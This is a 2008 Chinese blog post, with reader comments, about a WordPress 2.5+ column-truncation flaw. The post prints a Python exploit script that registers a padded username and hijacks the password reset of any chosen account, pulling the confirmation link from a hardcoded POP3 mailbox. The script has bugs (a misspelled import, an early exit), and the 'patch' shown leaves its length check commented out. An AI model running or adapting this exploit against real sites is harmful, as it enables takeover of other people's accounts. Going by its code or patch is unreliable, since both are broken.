title: wordpress漏洞利用-更改任意用户的密码
tags:
  - exploit
  - Python
  - wordpress
id: 311
categories:
  - 编程相关
date: 2008-09-09 17:06:27
---

最近wordpress又出现了一个漏洞，详细描述见这里:[http://milw0rm.com/exploits/6397](http://milw0rm.com/exploits/6397)，关于漏洞的形成原因这里:[http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities/](http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities/)有很好的描述，主要原因是由于wordpress对用户名的检查不足，使得过长的用户名可以注册，从而产生这个问题。

贴一下我写的利用工具，针对2.5及以上版本，可以更改（这里用重置更恰当）任意用户的密码，当然前提是这个wordpress开放了注册：
```
#!/usr/bin/env python
#coding=utf-8
#author: cocobear.cn@gmail.com
#website:http://cocobear.github.io

""" exploit description:
        http://milw0rm.com/exploits/6397
    influencing:
        wordpress 2.5 and above
    This short code can change any user's password.
"""

import urllib,cookelib,urllib2,httplib
import sys
import poplib

#all you need to do is change this two lines:
base_url = "http://c.kensou.me/blog/"
hack_user= "cocobear"

def init():
    cookie = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))

    exheaders = [("User-Agent","Opera/9.27 (X11; Linux x86_64; U; en)"),("Connection","Keep-Alive"),("Referer","http://zzfw.sn.chinamobile.com"),("Accept","text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"),("Accept-Charset","iso-8859-1, utf-8, utf-16, *;q=0.1"),("Cookie2","$Version=1"),]

    opener.addheaders = exheaders
    urllib2.install_opener(opener)
    return opener

def register(opener):
    global base_url,hack_user,hack_mail

    #register a hack user
    num = 60 - len(hack_user)
    hack_user = hack_user + " "*num + "x"
    body = (("user_login",hack_user),("user_email",hack_mail),)
    ret  = opener.open(base_url+"action=register",urllib.urlencode(body))
    print ret.read()
    exit()

def change_passwd(opener):
    global base_url,hack_mail,hack_pass

    body = (("user_login",hack_mail),)
    print body
    ret  = opener.open(base_url+"action=lostpassword",urllib.urlencode(body))

    print ret.read()

    #get confirm mail
    pop = poplib.POP3('pop.sina.com')
    pop.user(hack_mail)
    pop.pass_(hack_pass)
    count = pop.stat()[0]
    try:
        data = pop.retr(count)[1]
    except poplib.error_proto:
        print 'get mail error'
        return -1

    for l in data:
        if l.startswith(base_url):
            confirm_url = l
            print "Successful!"

    #visit confirm mail
    ret = opener.open(confirm_url)
    #print ret.read()

def main(argv=None):
    opener=init()
    register(opener)
    change_passwd(opener)

hack_mail= "wordpress_sql@sina.com"
hack_pass= "1234566"

base_url+= "wp-login.php?"

if __name__ == "__main__":
    sys.exit(main())
```

大家不用试我的博客了，我自己打补丁了：
```
function validate_username( $username ) {
       /* if (strlen($username) > 60) {
                return False;
        }
       */
        $sanitized = sanitize_user( $username, true );
        $valid = ( $sanitized == $username );
        return apply_filters( 'validate_username', $valid, $username );
}
```
修改wp-includes/registration.php文件中的validate_username函数，注释部分是我添加的。
## Comments

**[orz](#4182 "2008-09-09 21:35:19"):** 你好，请问这段代码如何编译呢～

**[nihuo13](#4183 "2008-09-09 23:32:50"):** cookelib应该是cookielib吧?

**[luguo](#4180 "2008-09-09 17:30:47"):** Orz

**[Amankwah](#4185 "2008-09-10 07:13:47"):** 为什么要开放注册呢？

**[草儿](#4323 "2008-09-17 15:08:39"):** 我只是在前几天看到这篇新闻后把注册关闭了，你倒是够狠，直接把程序都写出来了…… 这几天干嘛呢，一直不见你？

**[crazyfranc](#4247 "2008-09-16 21:21:00"):** 不开放就没那么多事了!

